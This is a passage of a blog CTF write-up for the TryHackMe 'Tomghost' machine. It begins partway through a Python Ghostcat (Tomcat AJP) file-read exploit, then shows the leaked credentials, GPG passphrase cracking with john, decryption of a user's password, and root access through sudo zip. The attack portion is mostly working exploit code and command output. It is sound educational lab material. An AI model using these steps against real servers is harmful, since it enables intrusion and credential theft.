<span class="n">parser</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="sh">"</span><span class="s">-f</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">--file</span><span class="sh">'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="sh">'</span><span class="s">WEB-INF/web.xml</span><span class="sh">'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="sh">"</span><span class="s">file path :(WEB-INF/web.xml)</span><span class="sh">"</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="nf">parse_args</span><span class="p">()</span>
<span class="n">t</span> <span class="o">=</span> <span class="nc">Tomcat</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">target</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">)</span>
<span class="n">_</span><span class="p">,</span><span class="n">data</span> <span class="o">=</span> <span class="n">t</span><span class="p">.</span><span class="nf">perform_request</span><span class="p">(</span><span class="sh">'</span><span class="s">/asdf</span><span class="sh">'</span><span class="p">,</span><span class="n">attributes</span><span class="o">=</span><span class="p">[</span>
    <span class="p">{</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">req_attribute</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">:[</span><span class="sh">'</span><span class="s">javax.servlet.include.request_uri</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">]},</span>
    <span class="p">{</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">req_attribute</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">:[</span><span class="sh">'</span><span class="s">javax.servlet.include.path_info</span><span class="sh">'</span><span class="p">,</span><span class="n">args</span><span class="p">.</span><span class="nb">file</span><span class="p">]},</span>
    <span class="p">{</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">:</span><span class="sh">'</span><span class="s">req_attribute</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">:[</span><span class="sh">'</span><span class="s">javax.servlet.include.servlet_path</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">/</span><span class="sh">'</span><span class="p">]},</span>
    <span class="p">])</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">'</span><span class="s">----------------------------</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">([</span><span class="n">d</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span> <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]))</span>
</pre></table></code></div></div><p>Using the exploit to get the default file</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>$ ./ajpexp.py -p 8009 &lt;target_ip&gt;

Getting resource at ajp13://&lt;target_ip&gt;:8009/asdf
----------------------------
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!--
&lt;...snip...&gt;

  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
  &lt;description&gt;
     Welcome to GhostCat
	skyfu*k:8730281lkjlkjdqlksalks
  &lt;/description&gt;

&lt;/web-app&gt;
</pre></table></code></div></div><p>Investigating the result, we find a username and a potentially hashed password. Actually, I spend quite a time looking for what kind of hash was that, but I just tried it itself as a password and it worked out connecting to ssh :)</p><p>In the machine, there exist two users under the home direcotry. The user <em>merlin</em> has the <code class="language-plaintext filepath highlighter-rouge">user.txt</code> flag and we can read it without any further permissions.</p><p>In the home dictory of <em>skyf_ck</em>, there is two interesting files: <code class="language-plaintext filepath highlighter-rouge">tryhackme.asc</code> and <code class="language-plaintext filepath highlighter-rouge">credential.pgp</code>.<br /> GPG was introduced for email security. Here <code class="language-plaintext filepath highlighter-rouge">tryhackme.asc</code> contains a GPG private key and <code class="language-plaintext filepath highlighter-rouge">credential.pgp</code> is potentially some encrypted message containing some credentials. Note: don’t confuse PGP and GPG, they both serve the same purpose.</p><p>To use the key in the decryption, a passphrase is required. This is what we’re going to brute force using <code class="language-plaintext highlighter-rouge">john</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ gpg2john tryhackme.asc &gt; hash   

$ john hash -wordlist:/usr/share/wordlists/rockyou.txt

&lt;...snip...&gt;
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2024-02-21 18:41) 16.66g/s 17866p/s 17866c/s 17866C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
</pre></table></code></div></div><p>There we have our passphrase. Note that I specified the rockyou wordlist after no match was found in the default wordlist used by <code class="language-plaintext highlighter-rouge">john</code>.</p><p>To add the private key for decryption we run the following command and enter the passphrase:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$ gpg --import tryhackme.asc

gpg: key 8F3DA3DEC6707170: "tryhackme &lt;stuxnet@tryhackme.com&gt;" not changed
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme &lt;stuxnet@tryhackme.com&gt;" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
</pre></table></code></div></div><p>Now for decryption, we’ll be prompted to enter the passphrase once again:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ gpg --decrypt credential.pgp

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme &lt;stuxnet@tryhackme.com&gt;"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
</pre></table></code></div></div><p>The message contains <em>merlin</em>’s credentials. After connection, we discover that the user can execute <code class="language-plaintext highlighter-rouge">zip</code> with root privilege.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>merlin@ubuntu:~$ sudo -l

Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
</pre></table></code></div></div><p>Let’s zip the root folder then. Once done, we’ll send that file to our machine to unzip it without any permissions required.\</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>merlin@ubuntu:/$ sudo /usr/bin/zip -r zipped root/

  adding: root/ (stored 0%)
  adding: root/root.txt (stored 0%)
  adding: root/.bashrc (deflated 54%)
  adding: root/.bash_history (stored 0%)
  adding: root/ufw/ (stored 0%)
  adding: root/ufw/ufw.sh (stored 0%)
  adding: root/.nano/ (stored 0%)
  adding: root/.profile (deflated 20%)
</pre></table></code></div></div><p>Found the root flag.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/blog/ctf-writeups/">CTF Writeups</a>, <a href="/blog/tryhackme/">TryHackMe</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/gpg/" class="post-tag no-text-decoration" >GPG</a> <a href="/tags/ghostcat/" class="post-tag no-text-decoration" >Ghostcat</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Tomghost%20-%20Ibrahim%20EO.&url=%2Fposts%2Ftomghost%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Tomghost%20-%20Ibrahim%20EO.&u=%2Fposts%2Ftomghost%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=%2Fposts%2Ftomghost%2F&text=Tomghost%20-%20Ibrahim%20EO." target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/linkvortex/">LinkVortex</a><li class="text-truncate lh-lg"> <a href="/projects/borderland/">Borderland</a><li class="text-truncate lh-lg"> <a href="/projects/chirpy-react/">Chirpy React</a><li class="text-truncate lh-lg"> <a href="/projects/attack-titan/">Shingeki</a><li class="text-truncate lh-lg"> <a href="/projects/passman/">PassMan</a></ul></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/race-condition/">Race Condition</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a></div></section></div></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/overpass-3-hosting/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1710284400" data-df="ll" > Mar 13, 2024 </time><h4 class="pt-0 my-2">Overpass 3 Hosting</h4><div class="text-muted"><p>You know them, you love them, your favourite group of broke computer science students have another business venture! Show them that they probably should hire someone for security...</p></div></div></a></article><article class="col"> <a href="/posts/overpass/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1710025200" data-df="ll" > Mar 10, 2024 </time><h4 class="pt-0 my-2">Overpass</h4><div class="text-muted"><p>What happens when a group of broke Computer Science students try to make a password manager? Obviously a perfect commercial success!</p></div></div></a></article><article class="col"> <a href="/posts/agent-sudo/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1707951600" data-df="ll" > Feb 15, 2024 </time><h4 class="pt-0 my-2">Agent Sudo</h4><div class="text-muted"><p>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/agent-sudo/" class="btn btn-outline-primary" aria-label="Older" ><p>Agent Sudo</p></a> <a href="/posts/power-analysis-warmup/" class="btn btn-outline-primary" aria-label="Newer" ><p>PowerAnalysis - Warmup</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://github.com/elomarii">Ibrahim El Omari</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >All rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.0.1" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/dfir/">DFIR</a> <a class="post-tag btn btn-outline-primary" href="/tags/cryptography/">Cryptography</a> <a class="post-tag btn btn-outline-primary" href="/tags/john/">john</a> <a class="post-tag btn btn-outline-primary" href="/tags/phishing/">Phishing</a> <a class="post-tag btn btn-outline-primary" href="/tags/wireshark/">Wireshark</a> <a class="post-tag btn btn-outline-primary" href="/tags/elk/">ELK</a> <a class="post-tag btn btn-outline-primary" href="/tags/gpg/">GPG</a> <a class="post-tag btn btn-outline-primary" href="/tags/kibana/">Kibana</a> <a class="post-tag btn btn-outline-primary" href="/tags/race-condition/">Race Condition</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.11/dayjs.min.js,npm/dayjs@1.11.11/locale/en.min.js,npm/dayjs@1.11.11/plugin/relativeTime.min.js,npm/dayjs@1.11.11/plugin/localizedFormat.min.js"></script> <script src="/assets/js/dist/post.min.js"></script> <script defer src="/app.min.js"></script> <script>SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
